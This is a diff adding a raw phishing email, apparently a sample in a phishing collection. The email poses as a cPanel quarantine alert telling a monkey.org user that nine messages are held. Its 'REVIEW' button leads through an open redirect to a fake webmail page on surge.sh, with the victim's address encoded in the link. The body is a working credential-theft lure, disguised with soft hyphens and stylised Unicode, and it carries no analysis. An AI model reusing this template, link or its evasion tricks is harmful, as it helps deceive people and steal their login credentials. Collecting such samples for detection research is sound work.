@@ -1,0 +1,93 @@
+Return-Path: homepage@kaigo-plus.jp
+Delivered-To: jose@monkey.org
+X-FDA: 82914599376.01.4DB9A0D
+Received: from kaigo-plus.jp (sv.kaigo-plus.jp [202.214.193.145])
+	by imf22.b.hostedemail.com (Postfix) with SMTP id D5B88160004
+	for <jose@monkey.org>; Fri, 20 Dec 2024 08:03:46 +0000 (UTC)
+Authentication-Results: imf22.b.hostedemail.com;	dkim=none;	dmarc=none;
+	spf=none (imf22.b.hostedemail.com: domain of homepage@kaigo-plus.jp has no
+ SPF policy when checking 202.214.193.145)
+ smtp.mailfrom=homepage@kaigo-plus.jp
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1734681824; a=rsa-sha256;
+	cv=none;
+	b=N5+i8SuLrVHT0zrJDXV8Foi/50YGlbA6YOy0tqmQSv7FR3XXGtQmF4CO7XQzvdsEDQQ28q
+	PifRegkFYAuT2BCC1QHSXHbkbRZZjzEo5HARpCTnC+u5fkjjctup0zL+Ky9q9MwAQ6p90I
+	AL0wc51o2D5ZggvHJCCWFGKSdMkwa3M=
+ARC-Authentication-Results: i=1;	imf22.b.hostedemail.com;	dkim=none;
+	dmarc=none;	spf=none (imf22.b.hostedemail.com: domain of
+ homepage@kaigo-plus.jp has no SPF policy when checking 202.214.193.145)
+ smtp.mailfrom=homepage@kaigo-plus.jp
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1734681824;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	 references;
+ bh=rmRosvEyvIMvnKTJtmbwfOZY79HVQKfmx+X4gNFjWxk=;
+	b=jAteo+gl0pEPVy+Y1S3hbLRW/DptdA/FJtU0zHgoZ+qH1dzk9GDWxhdgBXNcyhPy2n7gwE
+	/3v7ZGT0CSZTxqKB2IRRZWJrUlTJ8Rxk3rPWIIC7f4DTgzt0N4enjBrbXt8mNXp/5ReR10
+	/C4lhzAI+UzaO9dvLBcQ9dxGosMFzk4=
+Received: (qmail 9298 invoked by uid 48); 18 Dec 2024 09:41:00 +0900
+Date: 18 Dec 2024 09:41:00 +0900
+Message-ID: <20241218004100.9297.qmail@kaigo-plus.jp>
+To: jose@monkey.org
+Subject: =?UTF-8?B?OSBlbWFpbHMgb24gaG9sZCBmb3I=?=  12/17/2024 04:41:00 pm
+From: =?UTF-8?B?bW9ua2V5UmVwb3J0?= <eimuTs@kaigo-plus.jp>
+MIME-Version: 1.0 
+Content-Type: text/html; charset=UTF-8 
+Content-Transfer-Encoding: 8BIT 
+X-Rspamd-Queue-Id: D5B88160004
+X-Stat-Signature: 5az6n64cw3itg43y34ukfp44mgbhwec9
+X-Rspam-User: 
+X-Spam-Status: No, score=6.90
+X-Rspamd-Server: rspam06
+X-HE-Tag: 1734681826-839773
+X-HE-Meta: =?utf-8?q?U2FsdGVkX19poWRH4eifdNaDgK/faXS6jHHJhr5AHTZCubsp7g/P3aD?=
+ =?utf-8?q?Puz5jhFiwr+s6/avvgVnmuJKP3FJkyqdaOOL8bvoAXoX48gBvILpDyaKfBPDUI5Qu?=
+ =?utf-8?q?KbS5qlgrO050lcGqvFTBYYZ6/lr72l5/siKHtMDZCJCwPXvEo2/ytdryqDN30eCwi?=
+ =?utf-8?q?//6QL/LsLfgYQ0kgPscKNo2MSBBVrzHZVwUdt4n+a/JBK5tTlWME/gGgBMz6Ne2Le?=
+ =?utf-8?q?y8QaFxsXaQgeX/hUGJ61q6NwkkbtJsCNnaKk1auELGedWGjaWC4Oq0Zg6GWRightD?=
+ =?utf-8?q?WaA0Lr7cYn5M2JQhtSQiKNW0OEjIR+d0Gts2F5B1DzTR7Syl5KjNsgOuL9hVTOCBx?=
+ =?utf-8?q?H57bmdcJiIBPzIC5h9q+sNas8B/zamRKKojTqms1vZEk3bkqtb3uSl086Ck+fhLaK?=
+ =?utf-8?q?7l2Yoxtho0mH7TUD4k/a/P6m6/tljZ+/IRvvRWgzd6s6dnoFUB7uKL6Tw1mVKtowR?=
+ =?utf-8?q?VRKq8WnXo9b+bzq+jHqg7WsHuDz9t6TvtGbpnRzrrxx/hmzpqRddhlqGF6eABwtMB?=
+ =?utf-8?q?orrCJD8fPw/Z8yg/ZZder81YWwvtbtwMERF7Cu+uvCPaabePl4kSb+8Ym11loqBOu?=
+ =?utf-8?q?jcxflZpVOxAEhF0MJ19GA/FXgQ6x9+s6lhQD+T8XLrN/dUHY/5ch8+8f7m66q9ShF?=
+ =?utf-8?q?sZz/Ix71grbYz8mnwQH+Z6q7MXUSlo2JdNwK8rjM4JaYOWoV0JTyIcwPETAdXQVZR?=
+ =?utf-8?q?p9N2pL4IrHiLPw0DAEnL4HwpENMrHz7tUCZcb9JI9ZBumvBCirHwdKfeJDk7KeXwI?=
+ =?utf-8?q?ejPcO6AH/k/+3wbRXMEXNJayBqi69yBnwPNyvB14bTR0M3N9K1XHgvn8MCSTHnCe0?=
+ =?utf-8?q?4+lMe8nqjGVq4BUZiCHYZB0WoOqKUuBBaXr2fYdlJTpBis1blM3JilzH1hPzLfR6y?=
+ =?utf-8?q?3nDIq86PBNcqnTgBmJZL5m_P36wO3P3I4vAMVFdLRvX2P71F5KLedJoKhgcc+JBxl?=
+ =?utf-8?q?RjKOKP9JqB98HoI6NqgvpW/E2DlUvRuvXN9Ks0m11Xb8tyOW2qG/e9GQ05DvgPV8q?=
+ =?utf-8?q?2J2VMOFir14usri94Fv5QUksB+mchuKSZyu3XxVifBeEslOAA6MJJX9mkqmytN3Qq?=
+ =?utf-8?q?Oq25qOzRa/UC5clT9npdRKwbk2YHPPOYL93U7SV2KwVAMngVmkUrZJEfGAvdtovuC?=
+ =?utf-8?q?3BOKpM3DkwyLwuGFUryo9lcc9iKRTG4r90tw//KxYIckfRIaQEBPTrwYPDVzAZEQb?=
+ =?utf-8?q?3wluw6bOOqL5OAK9D/Nb4R1RuNnuL8gE8US0/I7upzcKEyNKwZgjUbVb7Mbzh+3DY?=
+ =?utf-8?q?ZbUtFAfc5hZ2n4yhLqJbfJLfR14kckLcn+BLLN8o0vddL0ry9bxzAttMce67EDDRb?=
+ =?utf-8?q?zuJn1jpKjlsEtCnYEtF5doC4mIdpusmbR0dfEzOtP4j3UOlkbqKrj?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 398
+
+
+<p><span style="font-size:72px;"><span style="color:#ff6633;"><span style="font-family: &quot;Source Sans Pro&quot;, Roboto, &quot;San Francisco&quot;, &quot;Segoe UI&quot;, sans-serif; text-align: center;">𝓬𝑷𝙖𝙣𝙚𝒍<span style="font-size:24px;">﹫</span></span></span></span></p> 
+ 
+<div dir="ltr" style="box-sizing: border-box; font-size: 16px; font-family: &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; color: rgb(29, 34, 40);"> 
+<div dir="ltr" style="box-sizing: border-box;"><span style="box-sizing: border-box;"><span style="box-sizing: border-box; font-family: Calibri, sans-serif, serif; color: rgb(38, 40, 42);">Attention:<span style="box-sizing: border-box;">&nbsp;</span><span style="box-sizing: border-box; text-decoration-line: underline; color: rgb(38, 73, 217);">monkey.org</span></span></span></div> 
+ 
+<div dir="ltr" style="box-sizing: border-box;"> 
+<div style="box-sizing: border-box; border-top: 0px; padding-top: 0px;"> 
+<p style="box-sizing: border-box; margin-top: 0px; margin-bottom: 1rem; font-family: Calibri, sans-serif, serif; color: rgb(38, 40, 42);"><span style="box-sizing: border-box;">You&nbsp;have&nbsp;[9]&nbsp;quarantined&nbsp;messages&nbsp;in&nbsp;your&nbsp;quarantine&nbsp;portal<br style="box-sizing: border-box;" /> 
+<br style="box-sizing: border-box;" /> 
+as&nbsp;of Friday, December 13, 2024 4:41 PM (PST).<br style="box-sizing: border-box;" /> 
+<br style="box-sizing: border-box;" /> 
+You&nbsp;can&nbsp;review&nbsp;these&nbsp;here&nbsp;and&nbsp;choose&nbsp;what&nbsp;happens&nbsp;to&nbsp;them.</span><br style="box-sizing: border-box;" /> 
+&nbsp;</p> 
+<span style="box-sizing: border-box;"><span style="box-sizing: border-box;"><a href="https://www.kalipdunyasi.com.tr/?num=1-1&link=https://webmail-009899897878-yarn.surge.sh?kdQzCH=aXGVMvbRqcxTLJegloOPnBwpKEfNYAuSjm%rIiDsZFy#am9zZUBtb25rZXkub3Jn" rel="noreferrer" style="box-sizing: border-box; color: white; text-decoration-line: none; background: 0% 50% rgb(0, 114, 198); height: 16px; width: 349px; padding: 19px; text-align: center; font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 15px; line-height: normal; font-family: monospace; display: block;" target="_blank">R&shy;E&shy;Ṿ&shy;&shy;I&shy;&shy;E&shy;W</a></span></span> 
+ 
+<div>&nbsp;</div> 
+</div> 
+</div> 
+</div>
+
